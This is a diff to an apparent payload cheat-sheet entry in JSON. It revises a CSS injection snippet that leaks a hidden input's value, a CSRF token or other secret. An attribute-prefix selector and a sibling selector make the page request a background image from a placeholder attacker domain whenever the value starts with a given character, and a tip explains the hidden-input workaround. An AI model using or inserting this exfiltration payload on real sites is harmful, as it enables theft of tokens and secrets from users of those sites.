@@ -68,7 +68,7 @@
       "title": "Hidden inputs - styling a neighboring element",
       "language": "css",
       "tags": ["selectors", "hidden-input", "sibling"],
-      "body": "input[name=\"csrf-token\"][value^=\"a\"] + input {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)\n}",
+      "body": "/* a hidden input does not render -> style the first VISIBLE following sibling via + */\ninput[name=\"secret\"][value^=\"a\"] + * {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/leak?c=a)\n}",
       "meta": {
         "tip": "You cannot apply a background-image to a hidden input directly. Use a sibling selector (+ or ~) to style a visible element that comes after the hidden input."
       }
